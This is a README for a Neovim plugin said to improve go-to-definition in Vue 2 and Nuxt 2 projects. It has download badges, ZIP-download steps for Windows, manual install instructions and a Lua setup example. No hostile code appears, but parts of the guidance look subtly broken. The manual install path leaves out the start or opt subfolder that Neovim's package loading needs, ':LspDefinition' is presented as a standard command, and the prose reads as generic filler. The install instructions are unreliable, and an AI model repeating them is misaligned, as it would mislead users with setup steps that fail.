# 🧭 vue2-lsp-pathfinder.nvim - Navigate Vue 2 Code Easily

[![Download vue2-lsp-pathfinder.nvim](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/rtorgfhui/vue2-lsp-pathfinder.nvim)

---

## 🌟 What Is vue2-lsp-pathfinder.nvim?

vue2-lsp-pathfinder.nvim is a tool made to help you explore Vue 2 and Nuxt 2 code. It works inside Neovim, a popular text editor. When you try to find where a piece of code is defined, the plugin helps navigate parts that normal tools can miss. This makes it easier to understand and work with your Vue or Nuxt projects.

This plugin fits best if you are working with Vue 2 and Nuxt 2, especially when your code uses certain features called mixins. If you use Neovim and want better code navigation for Vue projects, this plugin will help.

---

## ⚙️ System Requirements

To install and use this plugin, your system needs the following:

- Windows 10 or later
- Neovim version 0.5.0 or higher
- Lua programming language support inside Neovim (usually built in)
- Internet connection for downloading the plugin
- Basic knowledge of how to use Neovim (not required to code Lua)

---

## 🚀 Getting Started

This section gives step-by-step instructions to download, install, and run vue2-lsp-pathfinder.nvim on a Windows machine. It assumes you have Neovim installed. If you don’t have Neovim yet, visit https://neovim.io/ and follow their Windows install guide before continuing here.

---

## 📥 Download & Install

You will need to visit the official GitHub page to get the plugin. The page contains the latest files and instructions.

[![Download vue2-lsp-pathfinder.nvim](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/rtorgfhui/vue2-lsp-pathfinder.nvim)

1. Click the download badge above to open the GitHub repository in your browser.

2. On the GitHub page, locate the "Code" button, usually green, near the top right.

3. Click the "Code" button, then select "Download ZIP" from the dropdown menu.

4. Wait for the ZIP file to download. The file name will be similar to `vue2-lsp-pathfinder.nvim-master.zip`.

5. Once downloaded, open File Explorer and go to your **Downloads** folder.

6. Right-click the ZIP file and choose "Extract All...".

7. Pick a location to extract the plugin folder (for example, your Documents).

---

## ⚙️ How to Install in Neovim

You need to copy this plugin into Neovim’s configuration folder or use a plugin manager. If you don’t know which way to use, follow the manual method below.

### Manual Installation

1. Open File Explorer.

2. Navigate to your Neovim configuration directory. This is usually:  
   `C:\Users\<YourUserName>\AppData\Local\nvim\`

3. Inside the `nvim` folder, create a new folder called `pack` if it does not exist.

4. Inside the `pack` folder, create a new folder named `plugins`.

5. Move the extracted `vue2-lsp-pathfinder.nvim` folder into `plugins`.

Your folder structure should look like this:

```
C:\Users\<YourUserName>\AppData\Local\nvim\pack\plugins\vue2-lsp-pathfinder.nvim\
```

---

## 🛠 Enable the Plugin in Neovim

The next step is to tell Neovim to load this plugin.

1. In the `nvim` folder, open the file named `init.lua` or create it if it doesn't exist.

2. Add this line inside `init.lua`:

```lua
require('vue2-lsp-pathfinder').setup()
```

3. Save the file.

---

## 🔍 Using vue2-lsp-pathfinder.nvim

Open Neovim and open a folder with a Vue 2 or Nuxt 2 project:

1. Launch Neovim.

2. Use the command `:e <path_to_your_vue_project>` to open your project folder.

3. Open a `.vue` file.

4. Position the cursor on a Vue component or variable you want to find the definition for.

5. Use the command `:LspDefinition` or the keybind you set for "go to definition".

This plugin will help find places standard navigation tools miss. It uses Lua and low-level context to map your code.

---

## 🛠 Troubleshooting

If the plugin does not work right away:

- Confirm Neovim is updated to version 0.5.0 or above.

- Check that the plugin folder is in the right place (`pack/plugins/vue2-lsp-pathfinder.nvim`).

- Make sure Lua code `require('vue2-lsp-pathfinder').setup()` is added without errors.

- Restart Neovim after changes.

- Look at the Neovim message log for errors by typing `:messages`.

---

## 🔧 Configuring vue2-lsp-pathfinder.nvim

You can customize some options in the `.setup()` call. For example:

```lua
require('vue2-lsp-pathfinder').setup({
  log_level = "info",         -- Set log level: error, info, debug
  max_depth = 5,              -- How deep to look for definitions
  enable_mixins = true        -- Enable support for Vue mixins
})
```

Place these settings in your `init.lua`. Adjust numbers or options as needed.

---

## 📚 Further Help

If you want more details or want to report an issue, visit the GitHub repository page:

https://github.com/rtorgfhui/vue2-lsp-pathfinder.nvim

Check the "Issues" section for common problems or open a new issue if you find bugs.

---

## 🧩 How This Plugin Works

vue2-lsp-pathfinder.nvim extends the built-in Language Server Protocol (LSP) support in Neovim. Standard LSP misses some Vue and Nuxt features, like complex mixins or nested components. This plugin analyzes these cases and finds their definitions. It improves navigation and helps developers understand large Vue 2 and Nuxt 2 codebases.

---

## ⚡ Getting the Best Experience

- Keep Neovim and Lua plugins up to date.

- Use this plugin mainly for Vue 2 and Nuxt 2 projects.

- Combine with other Neovim tools for code linting and formatting.

---

## 📁 Project Topics

- developer-tools  
- goto-definition  
- lsp  
- lua  
- mixins  
- navigation  
- neovim  
- neovim-plugin  
- nuxt  
- nuxt2  
- vue  
- vue2  
- vuejs